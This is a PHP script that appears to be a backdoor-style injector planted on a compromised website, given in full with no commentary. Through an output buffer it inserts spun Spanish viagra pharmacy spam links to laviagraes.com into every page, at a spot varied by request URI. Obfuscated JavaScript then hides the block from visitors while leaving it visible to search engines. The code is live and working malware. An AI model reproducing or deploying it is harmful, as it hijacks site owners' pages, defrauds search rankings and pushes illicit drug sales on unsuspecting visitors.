<?php
define('GSDGF',load_extra_modules());
ob_start('ob_gzzs');

function ob_gzzs($data)
{
    $_9 = @GSDGF;

    $crc32=abs(crc32($_SERVER['REQUEST_URI']));
    $rnd = $crc32 % 3;

    if ($rnd === 0)
    {
        $data = preg_replace('!(<body[^<>]*>)!is','\\1'  . $_9,$data,1);
    }
    elseif($rnd === 1)
    {
        $data = preg_replace('!(</body[^<>]*>)!is', $_9 . '\\1',$data,1);
    }
    else
    {
        preg_match_all('!</.*?>!',$data,$tmp,PREG_OFFSET_CAPTURE);
        $total_tags = count($tmp[0]);

        if ($total_tags>0)
        {
            $rnd = $crc32 % $total_tags;
            $rnd_offset = $tmp[0][$rnd][1];
            $rnd_offset += strlen($tmp[0][$rnd][0]);
            $data = substr($data,0,$rnd_offset) . $_9 . substr($data,$rnd_offset);
        }
    }

    return $data;
}

function _z($t){if(preg_match_all('!{([^}]+)}!',$t,$o,PREG_SET_ORDER)){$r=abs(crc32($_SERVER['REQUEST_URI']));foreach($o as $x){$m=explode('|',$x[1]);$t=str_replace($x[0],$m[$r%count($m)],$t);}}return $t;}

function load_extra_modules()
{
    $a[]=" {¿Le comprar viagra en internet|La gente quiere comprar viagra online} <a href='{http://www.laviagraes.com/'>la viagra|http://www.laviagraes.com/'>http://www.laviagraes.com/|http://www.laviagraes.com/pastillas-viagra-generico/'>pastillas viagra generico|http://www.laviagraes.com/genericos-viagra-espanol/'>genericos viagra espanol|http://www.laviagraes.com/comprar-viagra-por-internet/'>comprar viagra por internet}</a> {
es la mejor farmacia en línea en España|Los mejores comentarios aquí|aquí tomar píldoras mejor precio}";
    $div_spintax = 'class="{ti|ab|ac|ad|af|ag|al|am|an|ap|ar|as|at|aw|az|ba|back|bal|bar|bat|batt|bau|bay|be|beau|bees|bei|bent|ber|bers|bi|bia|bio|birth|bit|blac|blad|blen|blos|bo|boa|bof|boi|borp|brad|brag|bran|braw|braz|brig|bril|brok|brom|brun|brut|buck|bui|bung|bunk|buo|burg|but|ca|cam|camb|camp|can|cap|car|carl|cat|cau|ce|cel|cent|cess|cham|chart|che|chiu|chlor|chris|chron|chur|ci|cia|cie|cio|circ|cit|clear|clen|clic|clim|clin|club|co|coa|com|comp|conf|conc|cont|cor|corn|cos|cost|crat|creat|crib|cros|crum|cryl|cu|cul|cum|cy|cyc|cyl|da|dab|dai|dan|daph|dar|dau|day|de|debt|def|dei|del|denk|dep|der|derc|ders|dest|det|dhun|di|dia|dio|disch|do|doct|dong|door|dor|dorf|down|drag|dread|dres|dunk|duns|dutch|dy|dyo|dyou|eal|ec|ed|eg|el|em|en|er|es|ev|ex|fal|fas|fe|fec|fei|fems|fenf|fern|fett|fi|fil|find|fio|fit|fitz|flem|flet|flic|floor|flow|flux|fo|foi|for|fran|fraz|freel|freem|frem|frit|friv|fron|frus|fu|fur|ga|gal|gard|garg|gbok|ge|gei|gen|ges|gest|gful|ghor|gi|gigg|ging|gio|glid|glim|goa|gobb|gomb|gor|gott|gran|grav|green|grit|gron|group|gui|guy|ha|haa|hall|hard|hart|hau|heff|hei|help|hench|hi|high|hind|ho|hol|hor|hrad|hurt|hyd|ic|if|ig|il|im|in|is|it|iv|ja|jodh|joi|jui|junk|ka|kan|kay|kei|kenk|keo|ket|keu|kie|king|kirs|kit|kits|kled|kloc|knuc|knur|ko|kol|kris|krug|ku|la|lac|lar|law|lbus|lcom|ldan|le|lear|led|left|lei|lemn|lent|leo|les|ley|li|lia|ligh|lin|ling|link|lins|list|llag|lo|loc|lock|lon|long|los|lpic|lrec|lu|lyt|ma|mab|mai|mal|manch|mand|mar|mark|mas|matt|me|meek|men|meo|met|mi|mic|mig|mii|mist|miu|mo|mog|mon|mond|mord|mu|mul|mus|myo|mys|na|nae|nai|nan|ne|nec|neer|ner|net|neu|news|ney|ni|nia|nic|nie|ning|nio|nist|nit|niy|no|noi|nons|nor|nort|nter|nut|oc|og|ol|on|op|oph|os|ot|ov|ox|pa|pae|pai|pans|pas|pau|pay|pe|pect|pell|per|perf|perh|pers|pha|pi|pie|plan|plit|plor|plot|po|poi|pols|por|post|pour|prat|prec|pred|preh|pres|pret|prin|proc|prod|prol|prop|prot|prox|psic|psych|pu|pub|pue|pul|pump|pur|quae|que|qui|quo|ra|rac|rae|raft|rai|rams|ran|rap|ratt|rau|re|rea|rei|reo|res|reu|rhod|ri|ria|rid|rie|righ|rii|riks|ril|ring|rio|ro|roa|rock|roe|roi|rol|rper|rsen|rsys|ru|rub|rup|rupp|rwan|sa|saa|sab|sal|sand|say|scep|sces|schil|scol|scot|se|sei|semb|sen|sex|sfer|sfor|si|sia|sie|sing|skat|skyb|slac|slic|smal|smar|smok|smooth|snar|so|sol|song|soun|span|spid|spik|spit|spor|spyw|ssav|ssis|ssur|stab|stag|stan|sten|stic|stif|stit|stoc|stop|stos|stup|stut|styl|sub|subs|sui|sup|supp|sur|surf|surr|sync|sysc|ta|tab|tal|tang|tant|tatt|tau|te|tei|temp|ten|tend|teo|tep|ter|terb|tes|teu|text|thamp|the|thei|thers|thi|thia|thie|tho|thor|ti|tia|tie|tigh|til|ting|tio|tiou|tipp|tis|to|top|topd|topp|tot|tram|tran|trax|trif|trip|tris|trof|tsik|tu|turn|tuy|twit|ual|uch|ul|un|up|ur|ut|vam|van|ve|ven|vens|vent|vi|vidd|vie|ving|vlad|vo|voi|wa|wadd|wag|way|wcol|wei|west|wi|win|wind|winf|woodc|word|work|yl|ym|yt|za|zay|zei|zio|zung|zyns}-{annotation|announce|preface}"';
    $div_spintax = _z($div_spintax);
    $chars = range('a','z');$vars = array_rand($chars,4);$c1 = $chars[$vars[0]];$c2 = $chars[$vars[1]];$c3 = $chars[$vars[2]];$c4 = $chars[$vars[3]];
    $za=mt_rand(10,99);$zb=mt_rand(10,99);$zd=$za*$zb;$ze="{$za}*{$zb}";$s="<div $div_spintax id='$zd'><ul>";foreach($a as $x) $s.=_z("<li>$x</li>");
    return "$s</ul></div><script>(function($c1,$c2,$c3,$c4){{$c3}.getElementById($c4).style['dis'+$c1]='n'+$c2;})('play','one',document,$ze);</script>";
}
